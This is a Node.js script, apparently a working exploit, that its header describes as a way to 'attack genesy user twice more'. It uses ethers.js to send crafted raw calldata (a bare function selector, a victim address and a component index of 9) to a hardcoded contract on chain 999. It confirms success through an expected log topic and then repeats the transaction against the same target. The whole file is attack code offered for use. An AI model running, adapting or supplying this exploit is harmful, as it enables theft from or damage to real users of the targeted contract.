// Script to attack genesy user twice more (assumes component 9)
const { ethers } = require('ethers');
require('dotenv').config();

// Configuration
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const RPC_URL = process.env.RPC_URL; 

// Contract configuration
const CONTRACT_ADDRESS = '0x711856153531a9c8d816a4cee6bd40df7406d172';
const FUNCTION_SIGNATURE = '0x875e886e'; 

const EXPECTED_TOPIC = '0xef6232ed0cc8664aa08147af4f6d665c2d1496b63e0d4e8a34b0f298839942b5';

async function callContract(targetAddress) {
  try {
    if (!ethers.utils.isAddress(targetAddress)) {
      throw new Error('Invalid Ethereum address');
    }

    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    console.log(`Using wallet address: ${wallet.address}`);
    
    const targetAddressClean = targetAddress.startsWith('0x') 
      ? targetAddress.slice(2) 
      : targetAddress;
      
    // Pad address to 32 bytes
    const paddedAddress = ethers.utils.hexZeroPad('0x' + targetAddressClean, 32).slice(2);
    
    const secondParam = '0000000000000000000000000000000000000000000000000000000000000009';
    
    const callData = `0x${FUNCTION_SIGNATURE.slice(2)}${paddedAddress}${secondParam}`;
    
    console.log('Contract address:', CONTRACT_ADDRESS);
    console.log('Target address (parameter):', targetAddress);
    console.log('Call data:', callData);
    
    // Get the current nonce
    const nonce = await provider.getTransactionCount(wallet.address, 'latest');
    
    const tx = {
      type: 2, // EIP-1559 transaction
      chainId: 999,
      to: CONTRACT_ADDRESS,
      data: callData,
      value: ethers.utils.parseEther('0'),
      nonce: nonce,
      gasLimit: 95853,
      maxFeePerGas: ethers.utils.parseUnits('0.5', 'gwei'),
      maxPriorityFeePerGas: ethers.utils.parseUnits('0.5', 'gwei')
    };
    
    console.log('Sending tx:', {
      to: tx.to,
      gasLimit: tx.gasLimit.toString(),
      maxFeePerGas: ethers.utils.formatUnits(tx.maxFeePerGas, 'gwei') + ' gwei',
      chainId: tx.chainId,
      type: tx.type
    });
    
    const transaction = await wallet.sendTransaction(tx);
    console.log(`tx sent: ${transaction.hash}`);
    
    // Wait for transaction to be mined
    const receipt = await transaction.wait();
    console.log('Transaction confirmed in block:', receipt.blockNumber);
    console.log('Gas used:', receipt.gasUsed.toString());
    console.log('Transaction status:', receipt.status === 1 ? 'Success' : 'Failed');
    
    let foundExpectedTopic = false;

    // look for topic to confirm real success
    if (receipt.status === 1 && receipt.logs && receipt.logs.length > 0) {
      
      receipt.logs.forEach((log, index) => {
        if (log.topics && log.topics.includes(EXPECTED_TOPIC)) {
          console.log(`✓ Found expected topic in log ${index}!`);
          foundExpectedTopic = true;
        }
      });
      
      if (!foundExpectedTopic) {
        console.log('expected topic not found, possible failure');
      }
    } else if (receipt.status === 0) {
      console.log('tx failed');
    }
    
    return {
      success: receipt.status === 1 && foundExpectedTopic,
      transactionHash: transaction.hash,
      blockNumber: receipt.blockNumber,
      from: wallet.address,
      to: CONTRACT_ADDRESS,
      targetAddress: targetAddress,
      gasUsed: receipt.gasUsed.toString(),
      status: receipt.status
    };
  } catch (error) {
    console.error('Error sending tx:', error);
    return {
      success: false,
      error: error.message
    };
  }
}

async function main() {
  const targetAddress = process.argv[2];
  
  if (!targetAddress) {
    console.error('Please provide a target address as an argument');
    console.log('Usage: node script.js 0xTargetAddressHere');
    process.exit(1);
  }
  
  const result = await callContract(targetAddress);
  
  if (result.success) {
    console.log('first tx successfully processed!');
    const resultTwo = await callContract(targetAddress);
    
    if (resultTwo.success) {
        console.log('second tx successful, exiting');
    } else {
        console.error('second tx failed:', resultTwo.error || 'See receipt status');
    }
  } else {
    console.error('first tx failed:', result.error || 'See receipt status');
  }
}

main().catch(console.error);
